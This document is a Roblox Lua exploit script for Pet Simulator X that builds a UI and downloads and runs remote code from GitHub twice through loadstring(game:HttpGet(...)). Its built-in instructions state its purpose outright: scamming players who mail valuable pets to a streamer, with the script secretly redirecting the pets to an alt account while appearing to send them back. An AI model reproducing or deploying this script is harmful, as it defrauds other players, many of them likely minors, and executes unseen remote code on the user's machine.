local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/FantaroX/partnermailspoof/main/libs')))()
getgenv().Username = "Boxking776Femboy"
OrionLib:MakeNotification({
 Name = "PSX Partner & Mail Spoof By Exteron",
 Content = "Good luck, follow the instructions in the UI.",
 Image = "rbxassetid://4483345998",
 Time = 5
})

local Window = OrionLib:MakeWindow({Name = "PSX Partner & Mail Spoof By Exteron", HidePremium = false, SaveConfig = false, ConfigFolder = "KryptedSaves"})

local PlayerTab = Window:MakeTab({
 Name = "Spoof",
 Icon = "rbxassetid://4483345998",
 PremiumOnly = false
})

local Tab = PlayerTab:AddSection({
 Name = "Player"
})


Tab:AddTextbox({
 Name = "Alt account username",
 Default = "SziaUram_001",
 TextDisappear = true,
 Callback = function(Value)
  getgenv().Username = Value
        OrionLib:MakeNotification({
         Name = "PSX Partner & Mail Spoof By Exteron",
         Content = "Set username to "..Value,
         Image = "rbxassetid://4483345998",
         Time = 5
        })
 end   
})

Tab:AddButton({
 Name = "Execute Script",
 Callback = function()
    if getgenv().Username then
    OrionLib:MakeNotification({
         Name = "PSX Partner & Mail Spoof By Exteron",
         Content = "Executing..",
         Image = "rbxassetid://4483345998",
         Time = 5
        })
        wait(1.75)
        OrionLib:Destroy()
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Success",
        Text = "Try using your partner hoverboard or signing pets",
        Duration = 5,
        })
     loadstring(game:HttpGet("https://raw.githubusercontent.com/Boxking776/GrubHub/main/free/SignAndMailSpoof.lua", true))()
     else
    OrionLib:MakeNotification({
         Name = "PSX Partner & Mail Spoof By Exteron",
         Content = "Please select a username",
         Image = "rbxassetid://4483345998",
         Time = 5
        })
    end
   end    
})
Tab:AddParagraph("","")
Tab:AddParagraph("Instructions",[[
How to use to scam:
- Put the username of the account you want to redirect the huge pets to in the 'Alt account username' section
- Click 'Execute script' (after reading)
- Start streaming
- Get people to send you huges in your mailbox for you to sign
- Sign them (rename them to your username) then send them back in the mailbox

It will look like you sent it back, but actually it redirects to the account you selected ('Alt account username')
Make it convincing, make an alt with a youtube username etc.

If you have any questions, message Exteron#7603
]])

OrionLib:Init()